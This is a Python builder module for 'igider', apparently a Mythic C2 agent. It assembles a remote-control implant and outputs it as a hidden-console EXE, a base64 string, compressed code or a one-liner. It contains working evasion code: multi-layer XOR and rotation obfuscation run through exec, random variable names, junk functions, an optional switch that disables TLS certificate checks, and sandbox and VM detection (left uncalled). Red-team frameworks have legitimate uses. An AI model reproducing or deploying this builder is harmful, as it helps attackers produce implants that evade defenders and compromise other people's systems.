from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio
import pathlib
import os
import tempfile
import base64
import hashlib
import json
import random
import string
import logging
import subprocess
import shutil
from typing import Dict, Any, List, Optional
from itertools import cycle
import datetime

class Igider(PayloadType):
    name = "igider"
    file_extension = "exe"  # Changed default extension to exe
    author = "@med"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "Production-ready Python agent with advanced obfuscation and encryption features, now supporting EXE generation"
    supports_dynamic_loading = True
    
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["py", "exe", "base64", "py_compressed", "one_liner"],
            default_value="exe"
        ),
        BuildParameter(
            name="exe_options",
            parameter_type=BuildParameterType.ChooseMultiple,
            description="EXE compilation options (only for exe output)",
            choices=["--onefile", "--noconsole", "--strip", "--upx"],
            default_value=["--onefile", "--noconsole"]
        ),
        BuildParameter(
            name="exe_icon",
            parameter_type=BuildParameterType.String,
            description="Path to icon file for EXE (optional)",
            default_value="",
            required=False
        ),
        BuildParameter(
            name="exe_name",
            parameter_type=BuildParameterType.String,
            description="Name for the generated EXE file",
            default_value="application",
            required=False
        ),
        BuildParameter(
            name="cryptography_method",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select crypto implementation method",
            choices=["manual", "cryptography_lib", "pycryptodome"],
            default_value="manual"
        ),
        BuildParameter(
            name="obfuscation_level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Level of code obfuscation to apply",
            choices=["none", "basic", "advanced"],
            default_value="basic"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        ),
        BuildParameter(
            name="exe_hidden_imports",
            parameter_type=BuildParameterType.String,
            description="Additional hidden imports for PyInstaller (comma-separated)",
            default_value="",
            required=False
        )
    ]
    
    c2_profiles = ["http", "https"]
    
    # Use relative paths that can be configured
    _BASE_DIR = pathlib.Path(".")
    
    @property
    def agent_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "mythic"
    
    @property
    def agent_icon_path(self) -> pathlib.Path:
        return self.agent_path / "icon.svg"
    
    @property
    def agent_code_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
        BuildStep(step_name="Applying Obfuscation", step_description="Implementing obfuscation techniques"),
        BuildStep(step_name="Compiling EXE", step_description="Compiling Python code to executable"),
        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("igider_builder")
        logger.setLevel(logging.DEBUG)
        return logger

    def get_file_path(self, directory: pathlib.Path, file: str) -> str:
        """Get the full path to a file, verifying its existence."""
        filename = os.path.join(directory, f"{file}.py")
        return filename if os.path.exists(filename) else ""
    
    async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
        """Helper to update build step status in Mythic UI."""
        try:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=message,
                StepSuccess=success
            ))
        except Exception as e:
            self.logger.error(f"Failed to update build step: {e}")

    def _load_module_content(self, module_path: str) -> str:
        """Safely load content from a module file."""
        try:
            with open(module_path, "r") as f:
                return f.read()
        except Exception as e:
            self.logger.error(f"Error loading module {module_path}: {e}")
            return ""

    def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
        """Apply configuration replacements to code."""
        for key, value in replacements.items():
            if isinstance(value, (dict, list)):
                # Convert Python objects to JSON, then fix boolean/null values for Python syntax
                json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
                code = code.replace(key, json_val)
            elif value is not None:
                code = code.replace(key, str(value))
        return code

    def _generate_random_identifier(self, length: int = 8) -> str:
        """Generate a random string for variable names to enhance obfuscation."""
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def _basic_obfuscate(self, code: str) -> str:
        """Apply basic XOR + Base64 obfuscation."""
        key = hashlib.md5(os.urandom(128)).hexdigest().encode()
        encrypted_content = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key))).encode()
        b64_enc_content = base64.b64encode(encrypted_content)
        xor_func = "chr(c^k)"
        
        # Use random variable names
        var_b64 = self._generate_random_identifier()
        var_key = self._generate_random_identifier()
        var_iter = self._generate_random_identifier()
        
        return f"""import base64, itertools
{var_b64} = {b64_enc_content}
{var_key} = {key}
{var_iter} = itertools.cycle({var_key})
exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter})).encode())
"""

    def _advanced_obfuscate(self, code: str) -> str:
        """Apply more advanced obfuscation with multi-layer encryption and junk code."""
        # First layer: XOR with a random key
        key1 = hashlib.md5(os.urandom(64)).hexdigest().encode()
        layer1 = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key1)))
        
        # Second layer: Rotate bytes by a random amount
        rotation = random.randint(1, 255)
        layer2 = ''.join(chr((ord(c) + rotation) % 256) for c in layer1)
        
        # Third layer: Base64 encode
        encoded = base64.b64encode(layer2.encode())
        
        # Generate random variable names
        var_data = self._generate_random_identifier()
        var_key = self._generate_random_identifier()
        var_rot = self._generate_random_identifier()
        var_result = self._generate_random_identifier()
        var_char = self._generate_random_identifier()
        var_k = self._generate_random_identifier()
        var_c = self._generate_random_identifier()
        
        # Add some junk functions that never get called
        junk1_name = self._generate_random_identifier()
        junk2_name = self._generate_random_identifier()
        
        # Build decoder with randomized variable names
        decoder = f"""
import base64, itertools, sys, random

def {junk1_name}():
    return [random.randint(1, 100) for _ in range(10)]

{var_data} = {encoded}
{var_key} = {key1}
{var_rot} = {rotation}

def {junk2_name}(x):
    return ''.join(chr((ord(c) + 13) % 256) for c in x)

{var_result} = ''
for {var_c}, {var_k} in zip(
    ''.join(chr((ord({var_char}) - {var_rot}) % 256) for {var_char} in base64.b64decode({var_data}).decode()),
    itertools.cycle({var_key})
):
    {var_result} += chr(ord({var_c}) ^ {var_k})

exec({var_result})
"""
        return decoder

    def _compress_code(self, code: str) -> str:
        """Compress the code using zlib for smaller payloads."""
        import zlib
        compressed = zlib.compress(code.encode(), level=9)
        compressed_b64 = base64.b64encode(compressed)
        
        return f"""import base64, zlib
exec(zlib.decompress(base64.b64decode({compressed_b64})))
"""

    def _create_one_liner(self, code: str) -> str:
        """Convert the payload to a one-liner for command line execution."""
        import re
        import textwrap
        
        # Remove comments and docstrings
        code = re.sub(r'#.*$', '', code, flags=re.MULTILINE)
        code = re.sub(r'""".*?"""', '', code, flags=re.DOTALL)
        code = re.sub(r"'''.*?'''", '', code, flags=re.DOTALL)
        
        # Normalize whitespace and indentations
        lines = []
        indent_stack = [0]
        
        for line in code.split('\n'):
            line = line.rstrip()
            if not line.strip():
                continue
                
            # Get current indentation level
            current_indent = len(line) - len(line.lstrip())
            
            # Handle indentation changes
            if current_indent > indent_stack[-1]:
                lines.append('__INDENT__')
                indent_stack.append(current_indent)
            elif current_indent < indent_stack[-1]:
                while current_indent < indent_stack[-1]:
                    lines.append('__DEDENT__')
                    indent_stack.pop()
                if current_indent != indent_stack[-1]:
                    raise ValueError("Indentation mismatch")
                    
            # Add the actual code line
            stripped_line = line.strip()
            if stripped_line.endswith(':'):
                stripped_line = stripped_line[:-1]
            lines.append(stripped_line)
        
        # Join with semicolons and handle indentation markers
        one_liner = []
        indent_level = 0
        
        for line in lines:
            if line == '__INDENT__':
                indent_level += 1
            elif line == '__DEDENT__':
                indent_level -= 1
            else:
                one_liner.append(line)
        
        # Final processing
        result = ';'.join(one_liner)
        
        # Clean up syntax
        result = re.sub(r';{2,}', ';', result)  # Remove duplicate semicolons
        result = re.sub(r';\s*(?=[)\]}]|$)', '', result)  # Remove semicolons before closing brackets
        
        # Fix control structures
        result = re.sub(r'(if|while|for|def|class|try|except|finally|else|elif)\s*\(', r'\1 ', result)
        
        return result

    def _add_evasion_features(self, code: str) -> str:
        """Add anti-analysis and VM detection capabilities with robust error handling."""
        evasion_code = []
         # 1. Add kill date check if specified
        try:
            kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
            if kill_date:
                try:
                    # Validate date format
                    datetime.datetime.strptime(kill_date, "%Y-%m-%d")
                    evasion_code.append(f"""
import datetime
if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
    import sys
    sys.exit(0)
""")
                except ValueError as e:
                    self.logger.warning(f"Invalid killdate format (should be YYYY-MM-DD): {e}")
        except (IndexError, AttributeError, TypeError) as e:
            self.logger.debug(f"Could not retrieve kill_date: {e}")

    # 2. Add platform-agnostic evasion checks
        evasion_code.append("""
def check_environment():
    import os
    import sys
    import socket
    import platform
    import subprocess
    
    # Generic suspicious indicators
    suspicious_indicators = {
        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
        'users': ['user', 'sandbox', 'vmuser'],
        'processes': ['vmtoolsd', 'vmwaretray', 'vboxservice']
    }
    
    # Check hostname
    try:
        hostname = socket.gethostname().lower()
        if any(name in hostname for name in suspicious_indicators['hostnames']):
            return False
    except:
        pass
    
    # Check username
    try:
        username = os.getenv("USER", "").lower()
        if any(user in username for user in suspicious_indicators['users']):
            return False
    except:
        pass
    
    # Platform-specific checks
    try:
        if platform.system().lower() == 'windows':
            import ctypes
            # Check disk size (Windows)
            try:
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    ctypes.c_wchar_p('C:\\\\'), 
                    None, 
                    None, 
                    ctypes.pointer(free_bytes)
                )
                if free_bytes.value < 21474836480:  # 20 GB
                    return False
            except:
                pass
            
            # Check for common VM processes (Windows)
            try:
                import wmi
                c = wmi.WMI()
                for process in c.Win32_Process():
                    if process.Name.lower() in suspicious_indicators['processes']:
                        return False
            except:
                pass
                
        else:  # Linux/Mac
            import shutil
            # Check disk size
            try:
                if shutil.disk_usage("/").free < 21474836480:  # 20 GB
                    return False
            except:
                pass
            
            # Check for VM-specific processes (Linux/Mac)
            try:
                ps = subprocess.Popen(['ps', '-aux'], stdout=subprocess.PIPE)
                output = subprocess.check_output(['grep', '-i'] + suspicious_indicators['processes'], stdin=ps.stdout)
                if output:
                    return False
            except:
                pass
                
    except Exception as e:
        # If any checks fail, assume we're in a good environment
        pass
    
    return True

# Execute evasion checks
# if not check_environment():
#     import sys
#     sys.exit(0)
""")
    
    # Combine all evasion code and prepend to the original code
        return "\n".join(evasion_code) + "\n" + code

    def _check_pyinstaller_availability(self) -> bool:
        """Check if PyInstaller is available in the system."""
        try:
            result = subprocess.run(['pyinstaller', '--version'], 
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _install_pyinstaller(self) -> bool:
        """Install PyInstaller if not available."""
        try:
            self.logger.info("Installing PyInstaller...")
            result = subprocess.run(['pip', 'install', 'pyinstaller'], 
                                  capture_output=True, text=True, timeout=120)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            self.logger.error(f"Failed to install PyInstaller: {e}")
            return False

    async def _compile_to_exe(self, python_code: str, temp_dir: str) -> tuple[bool, str, bytes]:
        """Compile Python code to EXE using PyInstaller."""
        try:
            # Check PyInstaller availability
            if not self._check_pyinstaller_availability():
                await self.update_build_step("Compiling EXE", "PyInstaller not found, attempting to install...")
                if not self._install_pyinstaller():
                    return False, "Failed to install PyInstaller", b""

            # Create temporary Python file
            exe_name = self.get_parameter("exe_name") or "application"
            py_file = os.path.join(temp_dir, f"{exe_name}.py")
            
            with open(py_file, 'w') as f:
                f.write(python_code)

            # Build PyInstaller command
            cmd = ['pyinstaller']
            
            # Add user-selected options
            exe_options = self.get_parameter("exe_options") or []
            for option in exe_options:
                if option == "--onefile":
                    cmd.append('--onefile')
                elif option == "--noconsole":
                    cmd.append('--noconsole')
                elif option == "--strip":
                    cmd.append('--strip')
                elif option == "--upx":
                    cmd.append('--upx-dir=/usr/bin')  # Assumes UPX is in standard location
            
            # Add icon if specified
            exe_icon = self.get_parameter("exe_icon")
            if exe_icon and os.path.exists(exe_icon):
                cmd.extend(['--icon', exe_icon])
            
            # Add hidden imports if specified
            hidden_imports = self.get_parameter("exe_hidden_imports")
            if hidden_imports:
                for imp in hidden_imports.split(','):
                    imp = imp.strip()
                    if imp:
                        cmd.extend(['--hidden-import', imp])
            
            # Add common hidden imports for agent functionality
            common_imports = [
                'base64', 'json', 'hashlib', 'itertools', 'datetime',
                'socket', 'ssl', 'urllib', 'urllib.request', 'urllib.parse',
                'platform', 'subprocess', 'threading', 'time', 'os', 'sys'
            ]
            
            for imp in common_imports:
                cmd.extend(['--hidden-import', imp])
            
            # Specify output directory and name
            cmd.extend(['--distpath', temp_dir])
            cmd.extend(['--workpath', os.path.join(temp_dir, 'build')])
            cmd.extend(['--specpath', temp_dir])
            cmd.extend(['--name', exe_name])
            
            # Add the Python file
            cmd.append(py_file)
            
            await self.update_build_step("Compiling EXE", f"Running PyInstaller with command: {' '.join(cmd)}")
            
            # Run PyInstaller
            result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True, timeout=300)
            
            if result.returncode != 0:
                error_msg = f"PyInstaller failed with return code {result.returncode}\nSTDOUT: {result.stdout}\nSTDERR: {result.stderr}"
                await self.update_build_step("Compiling EXE", error_msg, False)
                return False, error_msg, b""
            
            # Find the generated EXE
            if "--onefile" in exe_options:
                exe_path = os.path.join(temp_dir, f"{exe_name}.exe")
            else:
                exe_path = os.path.join(temp_dir, exe_name, f"{exe_name}.exe")
            
            if not os.path.exists(exe_path):
                error_msg = f"EXE file not found at expected location: {exe_path}"
                await self.update_build_step("Compiling EXE", error_msg, False)
                return False, error_msg, b""
            
            # Read the EXE file
            with open(exe_path, 'rb') as f:
                exe_data = f.read()
            
            await self.update_build_step("Compiling EXE", f"Successfully compiled EXE ({len(exe_data)} bytes)")
            return True, "EXE compilation successful", exe_data
            
        except subprocess.TimeoutExpired:
            error_msg = "PyInstaller compilation timed out"
            await self.update_build_step("Compiling EXE", error_msg, False)
            return False, error_msg, b""
        except Exception as e:
            error_msg = f"Error during EXE compilation: {str(e)}"
            await self.update_build_step("Compiling EXE", error_msg, False)
            return False, error_msg, b""

    async def build(self) -> BuildResponse:
        """Build the Igider payload with the specified configuration."""
        resp = BuildResponse(status=BuildStatus.Success)
        build_errors = []
        temp_dir = None
        
        try:
            # Step 1: Initialize build
            await self.update_build_step("Initializing Build", "Starting build process...")
            
            # Create temporary directory for EXE compilation
            temp_dir = tempfile.mkdtemp(prefix="igider_build_")
            
            # Step 2: Gather components
            await self.update_build_step("Gathering Components", "Loading agent modules...")
            
            # Load base agent code
            base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
            if not base_agent_path:
                build_errors.append("Base agent code not found")
                await self.update_build_step("Gathering Components", "Base agent code not found", False)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "\n".join(build_errors)
                return resp
                
            base_code = self._load_module_content(base_agent_path)
            
            # Load appropriate crypto module
            crypto_method = self.get_parameter("cryptography_method")
            if crypto_method == "cryptography_lib":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
            elif crypto_method == "pycryptodome":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "pycrypto_lib")
            else:  # default to manual
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
                
            if not crypto_path:
                build_errors.append(f"Crypto module '{crypto_method}' not found")
                crypto_code = "# Error loading crypto module"
            else:
                crypto_code = self._load_module_content(crypto_path)
            
            # Load command modules
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.get_file_path(self.agent_code_path, cmd)
                if not command_path:
                    build_errors.append(f"Command module '{cmd}' not found")
                else:
                    command_code += self._load_module_content(command_path) + "\n"
            
            # Step 3: Configure agent
            await self.update_build_step("Configuring Agent", "Applying agent configuration...")
            
            # Replace placeholders with actual code/config
            base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
            
            
            # Process C2 profile configuration
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
            
            # Configure HTTPS certificate validation
            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")
            
            # Step 4: Apply obfuscation
            await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
            
            # Add evasion features first
            base_code = self._add_evasion_features(base_code)
            
            # Apply obfuscation based on selected level
            obfuscation_level = self.get_parameter("obfuscation_level")
            if obfuscation_level == "advanced":
                base_code = self._advanced_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
            elif obfuscation_level == "basic":
                base_code = self._basic_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
            else:  # none
                await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
            
            # Step 5: Handle EXE compilation or other output formats
            output_format = self.get_parameter("output")
            
            if output_format == "exe":
                # Step 5a: Compile to EXE
                success, message, exe_data = await self._compile_to_exe(base_code, temp_dir)
                if not success:
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = message
                    return resp
                
                resp.payload = exe_data
                resp.build_message = f"Successfully built Windows executable ({len(exe_data)} bytes)"
                # Set proper file extension for EXE
                self.file_extension = "exe"
                
            else:
                # Step 5b: Finalize other payload formats
                await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
                
                if output_format == "base64":
                    resp.payload = base64.b64encode(base_code.encode())
                    resp.build_message = "Successfully built payload in base64 format"
                    self.file_extension = "b64"
                elif output_format == "py_compressed":
                    compressed_code = self._compress_code(base_code)
                    resp.payload = compressed_code.encode()
                    resp.build_message = "Successfully built compressed Python payload"
                    self.file_extension = "py"
                elif output_format == "one_liner":
                    one_liner = self._create_one_liner(base_code)
                    resp.payload = one_liner.encode()
                    resp.build_message = "Successfully built one-liner payload"
                    self.file_extension = "txt"
                else:  # default to py
                    resp.payload = base_code.encode()
                    resp.build_message = "Successfully built Python script payload"
                    self.file_extension = "py"
            
            # Report any non-fatal errors
            if build_errors:
                resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
            
        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            if output_format == "exe":
                await self.update_build_step("Compiling EXE", f"Build failed: {str(e)}", False)
            else:
                await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
        
        finally:
            # Clean up temporary directory
            if temp_dir and os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir)
                except Exception as e:
                    self.logger.warning(f"Failed to clean up temp directory: {e}")
            
        return resp